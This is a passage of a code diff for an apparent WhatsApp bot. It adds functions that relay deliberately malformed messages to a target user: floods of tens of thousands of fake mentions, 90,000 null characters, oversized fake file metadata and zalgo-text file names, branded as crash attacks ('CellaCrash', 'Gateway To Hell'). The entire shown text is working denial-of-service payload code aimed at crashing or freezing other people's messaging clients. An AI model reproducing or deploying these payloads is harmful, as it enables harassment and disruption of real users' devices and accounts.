+                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
+                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1714145232",
+                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
+                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
+                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
+                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
+                      thumbnailHeight: 172,
+                      thumbnailWidth: 480
+                    },
+                    hasMediaAttachment: true
+                  },
+                  nativeFlowMessage: {
+                    buttons: [{
+                      name: "single_select",
+                      buttonParamsJson: JSON.stringify({
+                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                        sections: [{
+                          title: "",
+                          rows: [{
+                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                            id: ".huii"
+                          }]
+                        }]
+                      })
+                    }]
+                  },
+                  contextInfo: {
+                    mentionedJid: zLoc,
+                    mentions: zLoc
+                  },
+                  disappearingMode: {
+                    initiator: "INITIATED_BY_ME",
+                    inviteLinkGroupTypeV2: "DEFAULT",
+                    messageContextInfo: {
+                      deviceListMetadata: {
+                        senderTimestamp: "1678285396",
+                        recipientKeyHash: "SV5H7wGIOXqPtg==",
+                        recipientTimestamp: "1678496731",
+                        deviceListMetadataVersion: 2
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }, {
+            participant: {
+              jid: zLoc
+            }
+          });
+          await sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+              message: {
+                locationMessage: {
+                  degreesLatitude: -21.980324912168495,
+                  degreesLongitude: 24.549921490252018,
+                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
+                  address: "",
+                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
+                }
+              }
+            }
+          }, {
+            participant: {
+              jid: zLoc
+            }
+          });
+          await sych.relayMessage(zLoc, {
+            botInvokeMessage: {
+              message: {
+                messageContextInfo: {
+                  deviceListMetadataVersion: 2,
+                  deviceListMetadata: {}
+                },
+                interactiveMessage: {
+                  nativeFlowMessage: {
+                    buttons: [{
+                      name: "payment_info",
+                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Cela;\",\"key\":\"🦄드림 가이 Cela\",\"key_type\":\"RANDOM\"}}]}"
+                    }]
+                  }
+                }
+              }
+            }
+          }, {
+            participant: {
+              jid: zLoc
+            }
+          });
+          await sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+              message: {
+                liveLocationMessage: {
+                  degreesLatitude: 11111111,
+                  degreesLongitude: -111111,
+                  caption: "xeontex",
+                  url: "https://" + ggg + ".com",
+                  sequenceNumber: "1678556734042001",
+                  jpegThumbnail: null,
+                  expiration: 7776000,
+                  ephemeralSettingTimestamp: "1677306667",
+                  disappearingMode: {
+                    initiator: "INITIATED_BY_ME",
+                    inviteLinkGroupTypeV2: "DEFAULT",
+                    messageContextInfo: {
+                      deviceListMetadata: {
+                        senderTimestamp: "1678285396",
+                        recipientKeyHash: "SV5H7wGIOXqPtg==",
+                        recipientTimestamp: "1678496731",
+                        deviceListMetadataVersion: 2
+                      }
+                    }
+                  },
+                  contextInfo: {
+                    mentionedJid: zLoc,
+                    mentions: zLoc,
+                    isForwarded: true,
+                    fromMe: false,
+                    participant: "0@s.whatsapp.net",
+                    remoteJid: "0@s.whatsapp.net"
+                  }
+                }
+              }
+            }
+          }, {
+            participant: {
+              jid: zLoc
+            }
+          });
+        }
+        
+        async function XeonButtNew(zLoc, ptcp = false) {
+   await sych.relayMessage(zLoc, {
+     ephemeralMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 1316134911,
+          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+          fileName: "🦄드림 가이 Xeon",
+          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1726867151",
+          contactVcard: true,
+          jpegThumbnail: "",
+         },
+         hasMediaAttachment: true,
+        },
+        body: {
+         text: "🦄드림 가이 Xeon\n" + "@916909137213".repeat(17000),
+        },
+        nativeFlowMessage: {
+         buttons: [{
+           name: "cta_url",
+           buttonParamsJson: "{ display_text: '🦄드림 가이 Xeon', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
+          },
+          {
+           name: "call_permission_request",
+           buttonParamsJson: "{}",
+          },
+         ],
+         messageParamsJson: "{}",
+        },
+        contextInfo: {
+         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
+          length: 30000
+         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+         forwardingScore: 1,
+         isForwarded: true,
+         fromMe: false,
+         participant: "0@s.whatsapp.net",
+         remoteJid: "status@broadcast",
+         quotedMessage: {
+          documentMessage: {
+           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+           fileLength: "9999999999999",
+           pageCount: 1316134911,
+           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+           fileName: "🦄드림 가이 Xeon",
+           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mediaKeyTimestamp: "1724474503",
+           contactVcard: true,
+           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+           jpegThumbnail: "",
+          },
+         },
+        },
+       },
+      },
+     },
+    },
+    ptcp ? {
+     participant: {
+      jid: zLoc
+     }
+    } : {}
+   );
+  };
+ async function VPen(zLoc, ptcp = false) {
+    let valhalla = "Hola" + "𑲭𑲭".repeat(50000);
+
+    let mentionedJidArray = Array.from({ length: 35000 }, () => 
+        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+    );
+
+    let battanz = {
+        groupMentionedMessage: {
+            message: {
+                listResponseMessage: {
+                    title: " @120363326274964194@g.us",
+                    listType: "SINGLE_SELECT",
+                    singleSelectReply: {
+                        selectedRowId: "Gateway To Hell"
+                    },
+                    description: " @120363326274964194@g.us",
+                    contextInfo: {
+                        mentionedJid: mentionedJidArray,
+                        groupMentions: [{ 
+                            groupJid: "120363326274964194@g.us", 
+                            groupSubject: valhalla 
+                        }]
+                    }
+                }
+            }
+        }
+    };
+
+    await sych.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
+}
+    async function SendPairing(zLoc, Ptcp = false) {
+			await sych.relayMessage(zLoc, {
+					viewOnceMessage: {
+						message: {
+								nativeFlowResponseMessage: {
+									"status":true,
+                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
+							}
+						}
+					}
+				},
+				ptcp ? {
+					participant: {
+						jid: zLoc
+					}
+				} : {}
+			);
+};
+
+   async function IosMJ(zLoc, ptcp = false) {
+      await sych.relayMessage(
+        zLoc,
+        {
+          extendedTextMessage: {
+            text: "CALL" + "\u0000".repeat(90000),
+            contextInfo: {
+              stanzaId: "1234567890ABCDEF",
+              participant: "0@s.whatsapp.net",
+              quotedMessage: {
+                callLogMesssage: {
+                  isVideo: true,
+                  callOutcome: "1",
+                  durationSecs: "0",
+                  callType: "REGULAR",
+                  participants: [
+                    {
+                      jid: "0@s.whatsapp.net",
+                      callOutcome: "1",
+                    },
+                  ],
+                },
+              },
+              remoteJid: target,
+              conversionSource: "source_example",
+              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+              conversionDelaySeconds: 10,
+              forwardingScore: 99999999,
+              isForwarded: true,
+              quotedAd: {
+                advertiserName: "Example Advertiser",
+                mediaType: "IMAGE",
+                jpegThumbnail:
+                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+                caption: "This is an ad caption",
+              },
+              placeholderKey: {
+                remoteJid: "0@s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890",
+              },
+              expiration: 86400,
+              ephemeralSettingTimestamp: "1728090592378",
+              ephemeralSharedSecret:
+                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+              externalAdReply: {
+                title: "CELLA - CALL" + "\u0000".repeat(50000),
+                body: "͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤" + "𑜦࣯".repeat(200),
+                mediaType: "VIDEO",
+                renderLargerThumbnail: true,
+                previewTtpe: "VIDEO",
+                thumbnail:
+                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+                sourceType: " x ",
+                sourceId: " x ",
+                sourceUrl: "https://t.me/cellasukanenen",
+                mediaUrl: "https://t.me/cellasukanenen",
+                containsAutoReply: true,
+                renderLargerThumbnail: true,
+                showAdAttribution: true,
+                ctwaClid: "ctwa_clid_example",
+                ref: "ref_example",
+              },
+              entryPointConversionSource: "entry_point_source_example",
+              entryPointConversionApp: "entry_point_app_example",
+              entryPointConversionDelaySeconds: 5,
+              disappearingMode: {},
+              actionLink: {
+                url: "https://t.me/cellasukanenen",
+              },
+              groupSubject: "Example Group Subject",
+              parentGroupJid: "6287888888888-1234567890@g.us",
+              trustBannerType: "trust_banner_example",
+              trustBannerAction: 1,
+              isSampled: false,
+              utm: {
+                utmSource: "utm_source_example",
+                utmCampaign: "utm_campaign_example",
+              },
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "6287888888888-1234567890@g.us",
+                serverMessageId: 1,
+                newsletterName: " target ",
+                contentType: "UPDATE",
+                accessibilityText: " target ",
+              },
+              businessMessageForwardInfo: {
+                businessOwnerJid: "0@s.whatsapp.net",
+              },
+              smbClientCampaignId: "smb_client_campaign_id_example",
+              smbServerCampaignId: "smb_server_campaign_id_example",
+              dataSharingContext: {
+                showMmDisclosure: true,
+              },
+            },
+          },
+        },
+        ptcp
+          ? {
+              participant: {
+                jid: zLoc,
+              },
+            }
+          : {}
+      );
+    }
+
+   async function f5(zLoc, ptcp = false) {
+    await sych.relayMessage(zLoc, {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
+                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1726867151",
+                contactVcard: true
+              },
+              hasMediaAttachment: true
+            },
+            body: {
